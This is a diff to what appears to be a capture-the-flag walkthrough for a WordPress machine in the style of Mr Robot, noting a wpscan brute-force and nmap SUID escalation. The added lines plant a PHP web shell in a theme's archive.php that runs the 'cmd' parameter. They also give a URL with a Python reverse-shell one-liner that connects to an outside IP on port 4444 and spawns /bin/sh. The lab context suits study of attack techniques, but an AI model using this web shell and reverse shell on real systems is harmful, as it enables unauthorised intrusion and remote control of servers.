@@ -39,7 +39,20 @@ wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot
 ### How to reverse shell
 https://github.com/pentestmonkey/php-reverse-shell
 ```bash
-nc -lvnp 53
+nc -lvnp 4444
+```
+### Reverse shell using cmd
+archive.php
+```bash
+<?php
+if (isset($_GET['cmd'])) {
+    passthru($_GET['cmd']);
+}
+?>
+```
+on the URL
+```bash
+http://3.95.226.44/wp-content/themes/twentyfifteen/archive.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.80.82.197",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 ### How to escalate priv with SUID bit set
 https://gtfobins.github.io/gtfobins/nmap/
